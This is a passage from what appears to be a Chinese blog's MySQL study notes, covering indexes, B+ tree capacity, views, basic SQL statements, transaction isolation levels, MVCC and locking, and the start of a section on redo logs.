class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">explain SELECT * FROM index_demo.user where age=&quot;4&quot;; #未使用索引</span><br><span class=\"line\">explain SELECT * FROM index_demo.user where sex=&quot;2&quot; and age=&quot;3&quot;; #使用索引</span><br><span class=\"line\">explain SELECT * FROM index_demo.user where age=&quot;3&quot; and sex=&quot;4&quot;;  #使用索引</span><br></pre></td></tr></table></figure>\n<p>mysql 查询优化器会判断纠正这条 sql 语句该以什么样的顺序执行效率最高，最后才生成真正的执行计划。</p>\n<p>因为对于三个索引的时候，只要是前两个存在，不论顺序是什么都是会使用索引的，</p>\n<h3 id=\"覆盖索引\"><a class=\"markdownIt-Anchor\" href=\"#覆盖索引\">#</a> 覆盖索引</h3>\n<p>select * from T where k between 3 and 5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table T (</span><br><span class=\"line\">ID int primary key,</span><br><span class=\"line\">k int NOT NULL DEFAULT 0, </span><br><span class=\"line\">s varchar(16) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class=\"line\">index k(k))</span><br><span class=\"line\">engine=InnoDB;</span><br><span class=\"line\"></span><br><span class=\"line\">insert into T values(100,1, &#x27;aa&#x27;),(200,2,&#x27;bb&#x27;),(300,3,&#x27;cc&#x27;),(500,5,&#x27;ee&#x27;),(600,6,&#x27;ff&#x27;),(700,7,&#x27;gg&#x27;);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/dcda101051f28502bd5c4402b292e38d.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">现在，我们一起来看看这条 SQL 查询语句的执行流程：</span><br><span class=\"line\">在 k 索引树上找到 k=3 的记录，取得 ID = 300；</span><br><span class=\"line\">再到 ID 索引树查到 ID=300 对应的 R3；</span><br><span class=\"line\">在 k 索引树取下一个值 k=5，取得 ID=500；</span><br><span class=\"line\">再回到 ID 索引树查到 ID=500 对应的 R4；</span><br><span class=\"line\">在 k 索引树取下一个值 k=6，不满足条件，循环结束。</span><br></pre></td></tr></table></figure>\n<p><strong>在这个过程中，回到主键索引树搜索的过程，我们称为回表</strong></p>\n<p>如果执行的语句是 select ID from T where k between 3 and 5，这时只需要查 ID 的值，而 ID 的值已经在 k 索引树上了，因此可以直接提供查询结果，不需要回表。也就是说，在这个查询里面，索引 k 已经 “覆盖了” 我们的查询需求，我们称为覆盖索引。</p>\n<p><strong>由于覆盖索引可以减少树的搜索次数，显著提升查询性能，所以使用覆盖索引是一个常用的性能优化手段。</strong></p>\n<h3 id=\"其他索引\"><a class=\"markdownIt-Anchor\" href=\"#其他索引\">#</a> 其他索引</h3>\n<p>我们国家的身份证号，一共 18 位，其中前 6 位是地址码，所以同一个县的人的身份证号前 6 位一般会是相同的。</p>\n<p>假设你维护的数据库是一个市的公民信息系统，这时候如果对身份证号做长度为 6 的前缀索引的话，这个索引的区分度就非常低了。</p>\n<p>按照我们前面说的方法，可能你需要创建长度为 12 以上的前缀索引，才能够满足区分度要求。</p>\n<p>但是，索引选取的越长，占用的磁盘空间就越大，相同的数据页能放下的索引值就越少，搜索的效率也就会越低。</p>\n<p>** 第一种方式是使用倒序存储。** 如果你存储身份证号的时候把它倒过来存，每次查询的时候，你可以这么写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select field_list from t where id_card = reverse(&#x27;input_id_card_string&#x27;);</span><br></pre></td></tr></table></figure>\n<p>由于身份证号的最后 6 位没有地址码这样的重复逻辑，所以最后这 6 位很可能就提供了足够的区分度。当然了，实践中你不要忘记使用 count (distinct) 方法去做个验证。</p>\n<p>** 第二种方式是使用 hash 字段。** 你可以在表上再创建一个整数字段，来保存身份证的校验码，同时在这个字段上创建索引。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; alter table t add id_card_crc int unsigned, add index(id_card_crc);</span><br></pre></td></tr></table></figure>\n<p>然后每次插入新记录的时候，都同时用 crc32 () 这个函数得到校验码填到这个新字段。由于校验码可能存在冲突，也就是说两个不同的身份证号通过 crc32 () 函数得到的结果可能是相同的，所以你的查询语句 where 部分要判断 id_card 的值是否精确相同。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select field_list from t where id_card_crc=crc32(&#x27;input_id_card_string&#x27;) and id_card=&#x27;input_id_card_string&#x27;</span><br></pre></td></tr></table></figure>\n<p>这样，索引的长度变成了 4 个字节，比原来小了很多。</p>\n<p>它们的相同点是，都不支持范围查询。倒序存储的字段上创建的索引是按照倒序字符串的方式排序的，已经没有办法利用索引方式查出身份证号码在 [ID_X, ID_Y] 的所有市民了。同样地，hash 字段的方式也只能支持等值查询。</p>\n<p>从查询效率上看，使用 hash 字段方式的查询性能相对更稳定一些。因为 crc32 算出来的值虽然有冲突的概率，但是概率非常小，可以认为每次查询的平均扫描行数接近 1。而倒序存储方式毕竟还是用的前缀索引的方式，也就是说还是会增加扫描行数。</p>\n<h3 id=\"一颗高度为3的b树能存储多少数据\"><a class=\"markdownIt-Anchor\" href=\"#一颗高度为3的b树能存储多少数据\">#</a> 一颗高度为 3 的 B + 树，能存储多少数据</h3>\n<h4 id=\"innodb页结构\"><a class=\"markdownIt-Anchor\" href=\"#innodb页结构\">#</a> InnoDB 页结构</h4>\n<ul>\n<li>在 InnoDB 中，索引默认使用的数据结构为 B + 树，而 <code>B+树里的每个节点都是一个页</code> ，默认的页大小为 <code>16KB</code> 。</li>\n<li>非叶子节点存的是索引值以及页的偏移量，而叶子节点上存放的则是完整的每行记录</li>\n</ul>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221129161706609.png\" alt=\"image-20221129161706609\"></p>\n<h4 id=\"非叶子节点能存多少条数据\"><a class=\"markdownIt-Anchor\" href=\"#非叶子节点能存多少条数据\">#</a> 非叶子节点能存多少条数据</h4>\n<blockquote>\n<ul>\n<li>\n<p>页默认 16KB</p>\n</li>\n<li>\n<p>File Header、Page Header 等一共占 102 个字节</p>\n</li>\n<li>\n<p>Infimum + Supremum 分别占 13 个字节</p>\n</li>\n<li>\n<p>记录头占 5 个字节</p>\n</li>\n<li>\n<p>id 占为 int，占 4 个字节</p>\n</li>\n<li>\n<p>页目录的偏移量占 4 个字节</p>\n</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   非叶子节点能存放的索引记录</span><br><span class=\"line\">=  (页大小 - File Header - Page Header - ...) / ( 记录头 + 主键 + 页偏移量)</span><br><span class=\"line\">= （16KB - 128B) / (5B + 4B + 4B) </span><br><span class=\"line\">=  16256 / 13</span><br><span class=\"line\">=  1250 条</span><br></pre></td></tr></table></figure>\n<h4 id=\"叶子节点能存多少条数据\"><a class=\"markdownIt-Anchor\" href=\"#叶子节点能存多少条数据\">#</a> 叶子节点能存多少条数据</h4>\n<blockquote>\n<ul>\n<li>变长列表占 1 个字节</li>\n<li>null 标志位忽略</li>\n<li>记录头占 5 个字节</li>\n<li>id 占为 int，占 4 个字节</li>\n<li>name 为 VARCHAR，编码为 UTF8，为了好算，所有行记录我都只用两个中文，那就是 2 * 3B = 6 个字节</li>\n<li>事务 ID 列占 6 个字节</li>\n<li>回滚指针列占 7 个字节</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   叶子节点能存放的数据记录</span><br><span class=\"line\">=  (页大小 - File Header - Page Header - ...) / ( 主键 + 字段 + 下一条记录的偏移量)</span><br><span class=\"line\">= （16KB - 128B) / (1B + 5B + 4B + 6B + 6B + 7B) </span><br><span class=\"line\">=  16256 / 29</span><br><span class=\"line\">=  560 条</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>根节点能放 1250 条索引记录</li>\n<li>第二层能放 1250 * 1250 = 1,562,500 条索引记录</li>\n<li>叶子节点 1250 * 1250 * 560 = 875,000,000 条数据记录，八亿多条数据</li>\n</ul>\n</blockquote>\n<h3 id=\"n叉树的n可以修改吗\"><a class=\"markdownIt-Anchor\" href=\"#n叉树的n可以修改吗\">#</a> N 叉树的 N 可以修改吗</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   非叶子节点能存放的索引记录</span><br><span class=\"line\">=  (页大小 - File Header - Page Header - ...) / ( 记录头 + 主键 + 页偏移量)</span><br><span class=\"line\">= （16KB - 128B) / (5B + 4B + 4B) </span><br><span class=\"line\">=  16256 / 13</span><br><span class=\"line\">=  1250 条</span><br></pre></td></tr></table></figure>\n<p>主键大小使我们可控的，如果是 bigint = 956</p>\n<p>我们也可以控制 Innodb_page_size，默认 16k，我们可以通过配置改为 8k</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgxMTg1MS9hcnRpY2xlL2RldGFpbHMvMTI1Nzg2MDky\">https://blog.csdn.net/weixin_44811851/article/details/125786092</span></p>\n<h2 id=\"视图\"><a class=\"markdownIt-Anchor\" href=\"#视图\">#</a> 视图</h2>\n<p>视图中的字段与对应的数据均来自已经存在的表，对于视图来说，这些已经存在的表就被称为” 基表”, 基表可以是一张表，也可以是多张表， 视图的本质可以理解为一条查询语句，视图中显示的结果，就是这条查询语句查询出的结果。</p>\n<p>应该是 mysql 对于子查询的优化不是很好，而使用视图本身往往就意味着使用子查询，所以，如果我们必须使用视图时，最好将视图中的 sql 语句尽量优化，或者说，数据量大的时候尽量避免使用视图。</p>\n<p>创建视图的原始表为基表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create view view1 as select * from stu where age &gt; 100</span><br><span class=\"line\">select * from view1;</span><br></pre></td></tr></table></figure>\n<p>删除视图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop view  view1</span><br><span class=\"line\">drop view if exists testvi;</span><br></pre></td></tr></table></figure>\n<p>查看视图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from information_schema.views where table_schema=stu;</span><br></pre></td></tr></table></figure>\n<p>修改视图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter view testvi as select  name,age from students;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ddl\"><a class=\"markdownIt-Anchor\" href=\"#ddl\">#</a> DDL</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into  stu (name,age) values (&#x27;haha&#x27;,5),(&#x27;shabi&#x27;,6)</span><br></pre></td></tr></table></figure>\n<p>insert 字段可以调换顺序，前后一起调换即可</p>\n<p>tinyint 最大范围为 127</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into values (&#x27;haha&#x27;,44)</span><br></pre></td></tr></table></figure>\n<p>不写字段名必须按照字段顺序和字段数插入，包括自增主键的值也需要手写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into stu set 1=1;</span><br></pre></td></tr></table></figure>\n<p>int (8) 代表显示 8 位数字，int 永远占四个字节</p>\n<p>concat &amp;&amp; group_concat()</p>\n<p>concat 连接时数据不能超过一行</p>\n<p>group_concat 将数据拼成一行</p>\n<p>substr &amp;&amp; substring</p>\n<p>从第一位开始截取两位，mysql 从 1 开始下标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select substring(&#x27;aaaaa&#x27;,1,2)   // aa</span><br><span class=\"line\">select substr(&#x27;aaaaaa&#x27;,1,1)</span><br></pre></td></tr></table></figure>\n<p>删除表中所有数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete from stu where id in(1,2,3);</span><br><span class=\"line\">truncate table stu;</span><br><span class=\"line\">delete from tb1 where name rlike &#x27;^t.*&#x27;;</span><br><span class=\"line\">[^abc] 匹配 或关系</span><br></pre></td></tr></table></figure>\n<p>更新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update yanchuang set name=&#x27;aaa&#x27;,age=333 where id = 1</span><br></pre></td></tr></table></figure>\n<p>修改表结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table aaa add bbb int(10) not null after id;</span><br><span class=\"line\">alter table ccc add bbb int(10) not null first;</span><br></pre></td></tr></table></figure>\n<p>修改字段类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table aaa modify no int not null</span><br></pre></td></tr></table></figure>\n<p>修改字段类型和内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table chenke change stu students int not null</span><br></pre></td></tr></table></figure>\n<h2 id=\"acid\"><a class=\"markdownIt-Anchor\" href=\"#acid\">#</a> ACID</h2>\n<p>原子性</p>\n<p>一致性</p>\n<p>持久性</p>\n<p>隔离性</p>\n<h2 id=\"隔离级别\"><a class=\"markdownIt-Anchor\" href=\"#隔离级别\">#</a> 隔离级别</h2>\n<p READ-UNCOMMITTED=\"\" |=\"\" READ-COMMITTED=\"\" |=\"\" REPEATABLE-READ=\"\" |=\"\" SERIALIZABLE=\"\">transaction-isolation =</p>\n<p>transaction-isolation 默认为可重复读 REPEATABLE-READ</p>\n<p>5.7 以前为 tx_isolation，之后变为 transcation_isolation</p>\n<p>开启事务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin /  start transaction</span><br></pre></td></tr></table></figure>\n<p>READ-UNCOMMITTED</p>\n<p>该隔离级别下允许一个事务读取到其它事务未提交的写操作</p>\n<p>数据不一致 - 脏读 - 读未提交造成的问题 (read-uncommitted)，即不提交也会使数据改变</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin \t\t\t\t\t\t\t\t\t\tbegin</span><br><span class=\"line\">select a  //100\t\t\t\t\t\t\t\tselect a  //100</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\tupdate a = 200</span><br><span class=\"line\">select a  //200</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1659959307923-5e69136b-42dd-4503-a4c6-42c1780ad717.png\" alt=\"img\"></p>\n<p>读已提交 (read-committed) 未提交时不会收到脏数据污染，但提交后还是会受污染，造成幻读（不可重复读）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin\t\t\t\t\t\t\t\t\t\t\tbegin</span><br><span class=\"line\">select a   //200\t\t\t\t\t\t\t\tselect a    //200</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tupdate a = 300 </span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tselect a    //300</span><br><span class=\"line\">select a   //200</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tcommit</span><br><span class=\"line\">select a   //300</span><br></pre></td></tr></table></figure>\n<p>repeatable-read 可重复读，修改后无论是否提交都不会改变查询结果，当两端都修改了数据后，会造成最先修改的一方的更新丢失</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin\t\t\t\t\t\t\t\t\t\t\tbegin</span><br><span class=\"line\">select a   //300\t\t\t\t\t\t\t\tselect a    //300</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tupdate a = 400 \t\t</span><br><span class=\"line\">select a   //300\t\t\t\t\t\t\t\tselect a    //400 </span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tcommit</span><br><span class=\"line\">select a   //300</span><br><span class=\"line\">commit</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin\t\t\t\t\t\t\t\t\t\t\tbegin</span><br><span class=\"line\">select a   //400\t\t\t\t\t\t\t\tselect a    //400</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tupdate a = 500</span><br><span class=\"line\">select a   //400\t\t\t\t\t\t\t\tselect a    //500</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\tcommit</span><br><span class=\"line\">update a = 600</span><br><span class=\"line\">commit\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">select a\t//600\t\t\t\t\t\t\t\tselect a    //600</span><br></pre></td></tr></table></figure>\n<p>serialize</p>\n<p>该隔离级别下很好的解决了 lost udpate 的问题</p>\n<p>读时加锁，别的进程不能修改，效率慢</p>\n<p>MySQL 提供了四种不同的隔离级别，分别是：read-uncommit、read-commit、repeated-read 和 serializable，后三种隔离级别分别结果了脏读、幻读、lost update 的问题。虽然 serializable 解决了全部的问题，但是实际运行时它的性能是最差的。所以日常生产环境中我们一般使用 read-commit、repeated-read 两种隔离级别，既能解决一些严重的不一致问题又能保持 MySQL 比较高的性能。</p>\n<p>解决更新丢失</p>\n<p>对于使用 InnoDB 存储引擎的表，其<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglODElOUElRTclQjAlODclRTclQjQlQTIlRTUlQkMlOTUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">聚簇索引</span>记录中包含了两个重要的隐藏列：</p>\n<p>trx_id：每当事务对聚簇索引中的记录进行修改时，都会把当前事务的事务 id 记录到 trx_id 中。</p>\n<p>roll_pointer：每当事务对聚簇索引中的记录进行修改时，都会把该记录的旧版本记录到 undo 日志中，通过 roll_pointer 这个指针可以用来获取该记录旧版本的信息。</p>\n<p>如果在一个事务中多次对记录进行修改，则每次修改都会生成 undo 日志，并且这些 undo 日志通过 roll_pointer 指针串联成一个版本链，版本链的头结点是该记录最新的值，尾结点是事务开始时的初始值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BEGIN;</span><br><span class=\"line\">UPDATE book SET stock = 200 WHERE id = 1;</span><br><span class=\"line\">UPDATE book SET stock = 300 WHERE id = 1;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20200620204317155.png\" alt=\"img\"></p>\n<p>undo log 记录回滚指针，可以在回滚的时候恢复原始数据，</p>\n<p><strong>事务隔离界别通过快照实现，但仅针对读已提交和可重复读</strong></p>\n<p><strong>对于使用 Read Uncommitted 隔离级别的事务来说，只需要读取版本链上最新版本的记录即可；</strong></p>\n<p><strong>对于使用 Serializable 隔离级别的事务来说，InnoDB 使用加锁的方式来访问记录；</strong></p>\n<p>事务 id 是递增分配的。ReadView 的机制就是在生成 ReadView 时确定了以下几种信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m_ids：表示在生成ReadView时当前系统中活跃的读写事务的事务id列表。</span><br><span class=\"line\"></span><br><span class=\"line\">min_trx_id：表示在生成ReadView时当前系统中活跃的读写事务中最小的事务id，也就是m_ids中的最小值。</span><br><span class=\"line\"></span><br><span class=\"line\">max_trx_id：表示生成ReadView时系统中将要分配给下一个事务的id值。</span><br><span class=\"line\"></span><br><span class=\"line\">creator_trx_id：表示生成该ReadView的事务的事务id。</span><br></pre></td></tr></table></figure>\n<p>这样事务 id 就可以分成 3 个区间：</p>\n<p><strong>区间 (0, min_trx_id)：如果被访问版本的 trx_id 小于 m_ids 中的最小值 up_limit_id，说明生成该版本的事务在 ReadView 生成前就已经提交了，所以该版本可以被当前事务访问</strong></p>\n<p><strong>区间 [min_trx_id, max_trx_id): 如果被访问版本的 trx_id 属性值在 m_ids 列表中最大值和最小值之间（包含），那就需要判断一下 trx_id 的值是不是在 m_ids 列表中。如果在，说明创建 ReadView 时生成该版本所属事务还是活跃的，因此该版本不可以被访问，需要查找 Undo Log 链得到上一个版本，然后根据该版本的 DB_TRX_ID 再从头计算一次可见性；如果不在，说明创建 ReadView 时生成该版本的事务已经被提交，该版本可以被访问。</strong></p>\n<p><strong>区间 [max_trx_id, +∞)：如果被访问版本的 trx_id 大于 m_ids 列表中的最大值 low_limit_id，说明生成该版本的事务在生成 ReadView 后才生成，所以该版本不可以被当前事务访问。需要根据 Undo Log 链找到前一个版本，然后根据该版本的 DB_TRX_ID 重新判断可见性</strong></p>\n<p>之前说到 ReadView 的机制只在 Read Committed 和 Repeatable Read 隔离级别下生效，所以只有这两种隔离级别才有 MVCC。在 Read Committed 隔离级别下，每次读取数据时都会生成 ReadView；而在 Repeatable Read 隔离级别下只会在事务首次读取数据时生成 ReadView，之后的读操作都会沿用此 ReadView。</p>\n<p>Read Committed 下 MVCC 工作原理</p>\n<p><strong>在提交前 [min_trx_id, max_trx_id) 在活跃别表中，读的是快照，提交后 (0, min_trx_id) 事务不再活跃，可以访问最新记录</strong></p>\n<p>因为每次执行查询语句都会生成新的 ReadView，所以在 Read Committed 隔离级别下的事务读取到的是查询时刻表中已提交事务修改之后的数据。</p>\n<p>Repeatable read 下 MVCC 工作原理</p>\n<p><strong>当第二次执行 SELECT 语句时不会生成新的 ReadView，依然会使用第一次查询时生成 ReadView。因此我们查询到的版本记录跟第一次查询到的结果是一样的：</strong></p>\n<p>只会查询出最开始的视图快照</p>\n<p>普通读 / 快照读</p>\n<p>普通读（也称快照读，英文名：Consistent Read），就是单纯的 SELECT 语句</p>\n<p>快照读用于只能获得到快照的数据，不能获得最新数据  通过 undo log + mvcc 实现</p>\n<p>事务会先使用 “排他锁” 锁定该行，将该行当前的值复制到 undo log 中，然后再真正地修改当前行的值，最后填写事务的 DB_TRX_ID ，使用回滚指针 DB_ROLL_PTR 指向 undo log 中修改前的行。</p>\n<p>这里解释一下 DB_TRX_ID 和 DB_ROLL_PTR 所代表的含义：</p>\n<ul>\n<li><strong>DB_TRX_ID</strong> :  6 字节 DB_TRX_ID 字段，表示最后更新的事务 id (update , delete , insert) 。此外，删除在内部被视为更新，其中行中的特殊位被设置为将其标记为已软删除。</li>\n<li><strong>DB_ROLL_PTR</strong> :  7 字节回滚指针，指向前一个版本的 undo log 记录，组成 undo 链表。如果更新了行，则撤消日志记录包含在更新行之前重建行内容所需的信息。</li>\n</ul>\n<p>解决快照读：永远读取最新的数据 - 当前读   ，当前读通过加锁</p>\n<p>修改数据时一定会加锁，select 通过 for update 加锁 ，即悲观锁</p>\n<p>select * from money where id=1 for update</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begin\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbegin</span><br><span class=\"line\">select a for update   //800\t\t\t\t\t\t\t\t\t\tselect a for update //被加锁，卡主</span><br><span class=\"line\">update a = 900\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tupdate a = 1000  // 被加锁，只要第一个进程不commit，这啥都干不了</span><br><span class=\"line\">commit\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tupdate 锁被释放，update执行</span><br></pre></td></tr></table></figure>\n<p>线程 1 加锁时线程 2 只能不加锁的 select</p>\n<p>当前读</p>\n<p>当前读，读取的是最新版本，并且需要先获取对应记录的锁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select ... lock in share mode 、</span><br><span class=\"line\">select ... for update、</span><br><span class=\"line\">update 、delete 、insert </span><br></pre></td></tr></table></figure>\n<p>当前读是通过 next-key 锁 (行记录锁 + 间隙锁) 来是实现的。</p>\n<blockquote>\n<p>行锁（Record Lock）：锁直接加在索引记录上面。</p>\n<p>间隙锁（Gap Lock）：是 Innodb 为了解决幻读问题时引入的锁机制，所以只有在 Read Repeatable 、Serializable 隔离级别才有。</p>\n<p>Next-Key Lock ：Record Lock + Gap Lock，锁定一个范围并且锁定记录本身 。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0c9e065743a31aef701442efd48f4dd2.png\" alt=\"img\"></p>\n<p>测试可知 delete from T where age = 7; 语句在 age 上的加锁区间为 (4,10) , 图解如下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/a3e94774374bfffd6390ebf7e3b4804c.png\" alt=\"img\"></p>\n<p>乐观锁</p>\n<p>通过增加额外字段实现</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221130172132896.png\" alt=\"image-20221130172132896\"></p>\n<h2 id=\"redo-log\"><a class=\"markdownIt-Anchor\" href=\"#redo-log\">#</a> redo log</h2>\n<p>事务的原子性、一致性和持久性由事务的 redo 日志和 undo 日志来保证。</p>\n<p>配置了 autocommit 后会自动提交，只有显示进入 begin 或者关闭该选项后手动提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/4c5ffaa6a9d64486b793c17e53494883.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第1步：先将原始数据从磁盘中读入内存中来，修改数据的内存拷贝</span><br><span class=\"line\"></span><br><span class=\"line\">第2步：生成一条重做日志并写入redo log buffer，记录的是数据被修改后的值</span><br><span class=\"line\"></span><br><span class=\"line\">第3步：当事务commit时，将redo log buffer中的内容刷新到 redo log file，对 